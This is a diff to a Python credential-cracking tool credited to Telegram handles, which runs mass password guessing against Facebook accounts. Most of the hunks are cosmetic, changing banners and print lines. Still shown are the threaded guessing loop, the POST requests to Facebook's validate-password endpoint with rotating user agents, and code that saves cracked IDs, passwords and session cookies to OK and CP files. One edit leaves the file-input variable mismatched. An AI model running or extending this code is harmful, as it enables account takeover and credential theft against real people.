@@ -254,17 +254,24 @@ def animation(u):
 #------------------[ LOGO-HAMA ]-----------------#
 logo =""" 
 \x1b[32m
- ██████   █████  ██     ██  █████  
-██   ██ ██   ██ ██     ██ ██   ██ 
-██████  ███████ ██  █  ██ ███████ 
-██   ██ ██   ██ ██ ███ ██ ██   ██ 
-██   ██ ██   ██  ███ ███  ██   ██
+ 
+     _  _______ _      _      ______ _____      
+\33[1;32m| |/ /_   _| |    | |    |  ____|  __ \         
+\33[1;33m| ' /  | | | |    | |    | |__  | |__) |     
+\33[1;34m|  <   | | | |    | |    |  __| |  _  /      
+\33[1;35m| . \ _| |_| |____| |____| |____| | \ \     
+\33[1;36m|_|\_\_____|______|______|______|_|  \_\
 
-𝐔𝐏𝐃𝐀𝐓𝐄 𝐁𝐘 @l4m_rawa
-𝐍𝐄𝐖 𝐓𝐎𝐎𝐋 🔥
-𝐕𝐄𝐒𝐈𝐎𝐍 𝟐.𝟓💥
-𝐁𝐚 𝐟𝐚𝐢𝐥𝐞 𝐭𝐚𝐳𝐚 𝐛𝐫𝐨🔥
-     
+
+
+\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+\33[1;36m TOOL CREATE BY➢ KILLER & RaWa
+\33[1;34m CHENEL➢@KILLER_SHOPPING
+\33[1;36m TELGRAM➢@i4m_killer & @l4m_rawa
+\33[1;34m VERSION➢1.1
+\33[1;32m KILLER is the father of Telegram
+\33[1;34m EXPIRED TOOL➢3DAYS
+\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
           
    
    
@@ -322,9 +329,9 @@ class jalan:
 def menu():
     os.system('clear')
     print(logo)
-    print(f"""\033[97;1m[\033[92;1m1\033[97;4m] \033[0;92m𝐂𝐑𝐀𝐂𝐊 𝐅𝐈𝐋𝐄 [WORK🔥]         """)
-    print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
-    print('\033[0;92m^^^^^^^^^^^^^^^^^^^^^^^^^^^^^')
+    print('\x1b[1;91m[ 1 ] CRACK FILE')
+    #print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
+    #print('\033[0;92m^^^^^^^^^^^^^^^^^^^^^^^^^^^^^')
     HAMA = input('\x1b[1;92m[+] 𝐇𝐀𝐋𝐁𝐙𝐇𝐄𝐑𝐀: ')
     if HAMA in ['111']:
         login()
@@ -336,11 +343,11 @@ def menu():
     elif HAMA in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
-        print('\033[0;92m================')
+        #print('\033[0;92m================')
         animation(' [×] DONE EXIT ')
         exit()
     else:
-        print('\033[0;92m================')
+        #print('\033[0;92m================')
         animation(' [×] SELECT CORRECTLY ')
         back()
  
@@ -503,14 +510,14 @@ def dump_massal():
             animation(' [×] TRY AGAIN ')
             os.system('clear')
     try:
-        print('\033[0;91m==================')
+        #print('\033[0;91m==================')
         print(f' \033[97;1m[\033[92;1m•\033[97;1m] IDYAKAN : \u001b[36m'+str(len(id))+'\033[1;37m')
         setting()
     except requests.exceptions.ConnectionError:
         print(f'{u}')
         back()
     except (KeyError,IOError):
-        print('\033[0;91m==================')
+        #print('\033[0;91m==================')
         animation(" [×] DUMP ID FAILED ")
         time.sleep(3)
         back()
@@ -518,11 +525,11 @@ def dump_massal():
 #-------------[ CRACK-FROM-FILE ]------------------#
  
 def crack_file():
-    print('\033[0;92m^^^^^^^^^^^^^^^^^^^^^')
-    o = input('\033[97;1m[\033[92;1m+\033[97;1m] 𝐍𝐀𝐖𝐄 𝐅𝐀𝐈𝐋⬅️📁 :\033[92;1m ')
+    #print('\033[0;92m^^^^^^^^^^^^^^^^^^^^^')
+    jum = input(' Enter your file ')
     try:lin = open(o).read().splitlines()
     except:
-        print('\033[0;92m==================')
+        #print('\033[0;92m==================')
         animation(' [×] FILE NOT FOUND')
         time.sleep(2)
         back()
@@ -533,9 +540,9 @@ def crack_file():
 #-------------[ PENGATURAN-IDZ ]---------------#
  
 def setting():
-    print('\033[0;92m=============================')
-    print("\033[97;1m[\033[92;1m3\033[97;1m] [𝐁𝐄𝐒𝐓] \x1b[33m[𝟑\x1b[33m] \x1b[33m[\033[0;92m \x1b[36m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐑𝐀𝐍𝐃𝐎𝐌✅x1b[33m]")
-    print('\033[0;92m=============================')
+    #print('\033[0;92m=============================')
+    print("ZHMARA (3) DABNE =")
+    #print('\033[0;92m=============================')
     hu = input('\033[97;1m[\033[92;1m+\033[97;1m]HALBZHERA= :\033[92;1m ')
     if hu in ['1','01']:
         for tua in sorted(id):
@@ -557,9 +564,9 @@ def setting():
         for bacot in id:
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
-    print('\033[0;92m^^^^^^^^^^^^^^^^^^^^')
-    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD  1 [UPDATE🔥] \x1b[33m[1\x1b[33m] \x1b[33m[\033[0;92m \x1b")
-    print('\033[0;92m^^^^^^^^^^^^^^^^^^^^^')
+    #print('\033[0;92m^^^^^^^^^^^^^^^^^^^^')
+    print("[ 1 ] METHOD ")
+    #print('\033[0;92m^^^^^^^^^^^^^^^^^^^^^')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] HALBZHERA= : ')
     if hc in ['1','01']:
         method.append('mobile')
@@ -575,7 +582,7 @@ def setting():
 def passwrd():
     print("")
     
-    print('\033[0;96m⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️')
+    #print('\033[0;96m⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -649,7 +656,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r{bo} [𝐑𝐀𝐖𝐀⚡️] {h}{loop}➡️{len(id)} ➡️ 𝐎𝐊:-{h}{ok} ")
+    sys.stdout.write(f"\r \033[1;37mRaWa-𝑻𝒆𝒔𝒕🦅 1 ]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -691,9 +698,9 @@ def crack(idf,pwv):
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 
-                print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
+                #print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                 #print(f'\r\033[0;93m[\33[1;96mNAKRETAUA[😅]\33[1;93m]  {idf}  {pw} ')
-                print ('\x1b[36m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
+                #print ('\x1b[36m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -702,9 +709,9 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
-                print(f'\r\x1b[32[𝐑𝐀𝐖𝐀-𝐎𝐊]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
-                print ('\x1b[32m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
+                #print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
+                print(f'\r\033[1;32m[ RAWA✅OK ]\n \033[1;35mACCOUNT💚USER : {idf}   [+] ACCOUNT PASS💚 : {pw}      ')
+                #print ('\x1b[32m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
                 break
